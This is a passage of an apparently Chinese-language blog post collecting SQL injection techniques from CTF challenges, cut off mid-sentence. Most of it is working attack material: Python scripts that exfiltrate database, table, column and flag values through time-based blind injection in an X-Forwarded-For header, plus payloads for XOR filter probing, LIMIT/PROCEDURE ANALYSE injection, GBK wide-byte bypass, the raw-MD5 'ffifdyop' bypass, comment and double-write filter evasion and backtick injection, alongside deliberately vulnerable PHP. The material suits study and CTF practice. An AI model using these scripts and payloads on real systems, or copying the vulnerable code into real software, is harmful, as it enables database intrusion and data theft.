class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$host=<span class="string">"localhost"</span>;</div><div class="line">$user=<span class="string">""</span>;</div><div class="line">$pass=<span class="string">""</span>;</div><div class="line">$db=<span class="string">""</span>;</div><div class="line"></div><div class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</div><div class="line"></div><div class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</div><div class="line"></div><div class="line">$ip = getIp();</div><div class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</div><div class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</div><div class="line">mysql_query($sql);</div></pre></td></tr></table></figure><p>数据库名的注入脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></div><div class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></div><div class="line">database = <span class="string">''</span></div><div class="line">flag = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</div><div class="line">        header = &#123;</div><div class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</div><div class="line">            &#125;</div><div class="line">        r = requests.get(url,headers=header)</div><div class="line">        t = r.elapsed.total_seconds()</div><div class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</div><div class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</div><div class="line">            database = database + j</div><div class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</div><div class="line">            flag = <span class="number">0</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</div><div class="line">        <span class="keyword">break</span></div><div class="line">print(<span class="string">'database:'</span>,database)</div></pre></td></tr></table></figure><p>注入表名的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></div><div class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></div><div class="line">table_name = <span class="string">''</span></div><div class="line">flag = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</div><div class="line">        header = &#123;</div><div class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</div><div class="line">            &#125;</div><div class="line">        r = requests.get(url,headers=header)</div><div class="line">        t = r.elapsed.total_seconds()</div><div class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</div><div class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</div><div class="line">            table_name = table_name + j</div><div class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</div><div class="line">            flag = <span class="number">0</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</div><div class="line">        <span class="keyword">break</span></div><div class="line">print(<span class="string">'table_name:'</span>,table_name)</div></pre></td></tr></table></figure><p>注入得到列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></div><div class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></div><div class="line">column_name = <span class="string">''</span></div><div class="line">flag = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</div><div class="line">        header = &#123;</div><div class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</div><div class="line">            &#125;</div><div class="line">        r = requests.get(url,headers=header)</div><div class="line">        t = r.elapsed.total_seconds()</div><div class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</div><div class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</div><div class="line">            column_name = column_name + j</div><div class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</div><div class="line">            flag = <span class="number">0</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</div><div class="line">        <span class="keyword">break</span></div><div class="line">print(<span class="string">'column_name:'</span>,column_name)</div></pre></td></tr></table></figure><p>最终注入得到列中的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></div><div class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></div><div class="line">flag = <span class="string">''</span></div><div class="line">f = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</div><div class="line">        header = &#123;</div><div class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</div><div class="line">            &#125;</div><div class="line">        r = requests.get(url,headers=header)</div><div class="line">        t = r.elapsed.total_seconds()</div><div class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</div><div class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</div><div class="line">            flag = flag + j</div><div class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</div><div class="line">            f = <span class="number">0</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> f == <span class="number">0</span> :</div><div class="line">        <span class="keyword">break</span></div><div class="line">print(<span class="string">'flag:'</span>,flag)</div></pre></td></tr></table></figure><h2 id="0x02-异或注入xor"><a href="#0x02-异或注入xor" class="headerlink" title="0x02 异或注入xor/^"></a>0x02 异或注入xor/^</h2><p>xor与^的区别：前者是做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据；后者是做位异或运算 如1^2=3 1^2=3</p><p>可以采用这种方式来判断目标站点过滤了什么关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;^(length(&apos;union&apos;)=5)%23</div><div class="line">当union被过滤时1^0 输出id=1</div><div class="line">当union没被过滤时 1 ^ 1 输出 id=0 并回显 error</div></pre></td></tr></table></figure><h2 id="0x03-limit注入"><a href="#0x03-limit注入" class="headerlink" title="0x03 limit注入"></a>0x03 limit注入</h2><p>在MySQL5.x版本中，后端采用如下形式进行SQL查询，此时注入点在order by语句后面无法使用union进行联合查询，因而需要另辟蹊径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 【注入点】</div></pre></td></tr></table></figure></p><p>在此处我们可以使用procedure关键字调用ANALYSE存储过程来完成注入。利用姿势有以下几种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//1.报错注入</div><div class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</div><div class="line"> </div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; SELECT host FROM mysql.user ORDER BY 1 LIMIT 0 PROCEDURE ANALYSE (0, (SELECT 3 ORDER BY updatexml(1, concat(0x3A, version()), 1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5&apos;</div><div class="line"></div><div class="line"></div><div class="line">//2.时间盲注，注意此时不能使用sleep</div><div class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</div><div class="line"></div><div class="line">//注:以上出现version()的地方都可以用想用的SQL语句替换</div></pre></td></tr></table></figure><h2 id="0x04-利用insert，update和delete注入获取数据"><a href="#0x04-利用insert，update和delete注入获取数据" class="headerlink" title="0x04 利用insert，update和delete注入获取数据"></a>0x04 利用insert，update和delete注入获取数据</h2><p>闭合形式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&apos; or (payload) or &apos;</div><div class="line">&apos; and (payload) and &apos;</div><div class="line">&apos; or (payload) and &apos;</div><div class="line">&apos; or (payload) and &apos;=&apos;</div><div class="line">&apos;* (payload) *&apos;</div><div class="line">&apos; or (payload) and &apos;</div><div class="line">&quot; – (payload) – &quot;</div></pre></td></tr></table></figure><p>利用方式:</p><ol><li>利用updatexml()获取数据</li><li>利用extractvalue()获取数据</li><li><p>利用name_const()获取数据</p><p> 注意：</p><blockquote><p>如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就洗洗睡吧。。</p></blockquote></li></ol><blockquote><p>如果显示ERROR 1060 (42S21): Duplicate column name ‘2’，就可以进一步获取更多数据。</p><ol><li>利用子查询注入</li></ol></blockquote><p>参考:<a href="http://wooyun.jozxing.cc/static/drops/tips-2078.html" target="_blank" rel="external">利用insert，update和delete注入获取数据</a></p><h2 id="0x05当update注入遇到关闭显错"><a href="#0x05当update注入遇到关闭显错" class="headerlink" title="0x05当update注入遇到关闭显错"></a>0x05当update注入遇到关闭显错</h2><p>注:此处提到的或逻辑运算对insert注入也是有效的</p><p>参考:</p><p><a href="https://blog.spoock.com/2018/06/02/update-sqli-without-error/" target="_blank" rel="external">当update注入遇到关闭显错</a></p><p><a href="http://godot.win/index.php/archives/9/" target="_blank" rel="external">在Update的注入中如果关闭了显错该怎么办</a></p><h2 id="0x06-Mysql字符编码利用技巧"><a href="#0x06-Mysql字符编码利用技巧" class="headerlink" title="0x06 Mysql字符编码利用技巧"></a>0x06 Mysql字符编码利用技巧</h2><p>latin1编码不支持汉字，因而可以采用编码绕过</p><p>参考:<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">《Mysql字符编码利用技巧》</a></p><h2 id="0x07-GBK-Injection"><a href="#0x07-GBK-Injection" class="headerlink" title="0x07 GBK Injection"></a>0x07 GBK Injection</h2><p>单引号会被/注掉，可以用%df吃掉/封闭id</p><p>查询字段数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1%df&apos; order by 2%23</div></pre></td></tr></table></figure><p>果然两个，顺带查看其用户，库名和版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1%df&apos; union select 1,concat_ws(char(32,58,32),user(),database(),version())%23</div></pre></td></tr></table></figure><p>注:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># concat_ws()第一个参数是分隔字符</div><div class="line"># char(32,58,32)表示的是 &quot;:&quot; 号</div><div class="line">MariaDB [(none)]&gt; select concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);</div><div class="line">+------------------------------------------+</div><div class="line">| concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |</div><div class="line">+------------------------------------------+</div><div class="line">| 11 : 22 : 33                             |</div><div class="line">+------------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>库名sae-chinalover,再爆表</p><p>单引号会被/注掉，所以写sae-chinalover的16进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1%df&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7361652d6368696e616c6f766572)%23</div></pre></td></tr></table></figure></p><p>注：<br>group_concat()是将某个字段的所有值打印在一起，方便一行输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select group_concat(name) from aa;</div><div class="line">+-------------------+</div><div class="line">|group_concat(name) |</div><div class="line">+-------------------+</div><div class="line">|10,20,20|</div></pre></td></tr></table></figure><p>有四个：ctf,ctf2,ctf3,ctf4,news，爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1%df&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7361652d6368696e616c6f766572 and table_name=0x63746634)%23</div></pre></td></tr></table></figure><p>ctf4里有id,flag,flag应该就在这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1%df&apos; union select 1,(select group_concat(id,flag) from ctf4)%23</div></pre></td></tr></table></figure><p>可以看到构造爆错后常规注入即可。</p><h2 id="0x08-MD5加密后的SQLi"><a href="#0x08-MD5加密后的SQLi" class="headerlink" title="0x08 MD5加密后的SQLi"></a>0x08 MD5加密后的SQLi</h2><p>目标语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;select * from admin where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</div></pre></td></tr></table></figure><blockquote><p>md5(string,raw)</p><p>string 必需。规定要计算的字符串。</p><p>raw 可选。规定十六进制或二进制输出格式：</p><p>• TRUE – 原始 16 字符二进制格式 &lt;关键点&gt;</p><p>• FALSE – 默认。32 十六进制数</p></blockquote><p>注入思路:</p><p>字符串经md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串</p><p>构造payload目标:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from admin where password=&quot;or&apos;xxx&apos;</div></pre></td></tr></table></figure><p>可用payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">content: 129581926211651571912466741651878684928</div><div class="line"></div><div class="line">md5加密为: 06da5430449f8f6f23dfc1276f722738</div><div class="line"></div><div class="line">作hex转字符串: ?T0D??o#??’or’8.N=?</div><div class="line"></div><div class="line">content: ffifdyop</div><div class="line"></div><div class="line">md5加密为: 276f722736c95d99e921722cf9ed621c</div><div class="line"></div><div class="line">作hex转字符串: ‘or’6蒥欓!r,b</div></pre></td></tr></table></figure><p>注：这个问题是在PHP中存在的</p><h2 id="0x09-空格被过滤"><a href="#0x09-空格被过滤" class="headerlink" title="0x09 空格被过滤"></a>0x09 空格被过滤</h2><p>空格过滤使用<code>/*xxx*/</code>进行绕过，</p><p>有时候关键词被过滤了可以使用双写绕过</p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">//为三个字段，接着查库</div><div class="line">?id=1/*0*/order/*0*/by/*0*/3%23</div><div class="line"></div><div class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,concat_ws(char(32,58,32),user(),database(),version())%23</div><div class="line"></div><div class="line">//查所有库</div><div class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(schema_name)/*0*/frfromom/*0*/information_schema.schemata%23</div><div class="line"></div><div class="line">//查test的表</div><div class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(table_name)/*0*/frfromom/*0*/information_schema.tables/*0*/where/*0*/table_schema=0x74657374%23</div><div class="line"></div><div class="line">//只有一个content,查列</div><div class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(column_name)/*0*/frfromom/*0*/information_schema.columns/*0*/where/*0*/table_schema=0x74657374/*0*/and/*0*/table_name=0x636f6e74656e74%23</div><div class="line"></div><div class="line">//有id,context,title。最后直接查context</div><div class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,context/*0*/frfromom/*0*/content%23</div><div class="line"></div><div class="line">//得到flag</div></pre></td></tr></table></figure><h2 id="0x10-符号问题"><a href="#0x10-符号问题" class="headerlink" title="0x10 ``符号问题"></a>0x10 ``符号问题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</div><div class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</div><div class="line">$table = Filter($table);</div><div class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</div><div class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</div><div class="line">$ret = sql_query($sql);</div><div class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><blockquote><p>反引号是为了区分MySql的保留字段与普通字符而引入的符号</p><p>引号一般用在字段的值，如果字段值是字符或字符串，则要加引号</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">MariaDB [test]&gt; select `flag` from flags;</div><div class="line">+----------------------------------------+</div><div class="line">| flag                                   |</div><div class="line">+----------------------------------------+</div><div class="line">| flag&#123;37316894c36cb32d2ca3f7d3add88024&#125; |</div><div class="line">+----------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">MariaDB [test]&gt; select &apos;flag&apos; from flags;</div><div class="line">+------+</div><div class="line">| flag |</div><div class="line">+------+</div><div class="line">| flag |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>payload:构造如下形式进行注入，<em>*</em>位置放入关键词<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">desc `***` `***`;</div><div class="line"></div><div class="line">MariaDB [test]&gt; desc `flags` `union select table_name from information_schema.tables`;</div><div class="line">Empty set (0.00 sec)</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://test.com/?table=test`  `union select table_name from information_schema.tables limit 1,1</div><div class="line"></div><div class="line">http://test.com/?table=test`  `union select column_name from information_schema.columns limit 1,1</div><div class="line"></div><div class="line">http://test.com/?table=test`  `union select flagUwillNeverKnow from secret_flag limit 1,1</div></pre></td></tr></table></figure><h2 id="0x11-rollup-amp-amp-offset"><a href="#0x11-rollup-amp-amp-offset" class="headerlink" title="0x11 rollup&amp;&amp;offset"></a>0x11 rollup&amp;&amp;offset</h2><p><code>limit 1 offset 2</code>从第二条记录开始查询，读取1条记录（intrude fuzz 1和2这两个位置的参数）</p><p><code>rollup</code>在group by 分组之后，再合计总数，可构造使得结果为null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line"><span class="comment">#$sql="SELECT * FROM interest WHERE uname = ''  or 1=1 group by pwd with rollup limit 1 offset 2 #'";</span></div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>获取flag需要满足<code>mysql_num_rows($query) == 1</code>和<code>$key[&#39;pwd&#39;] == 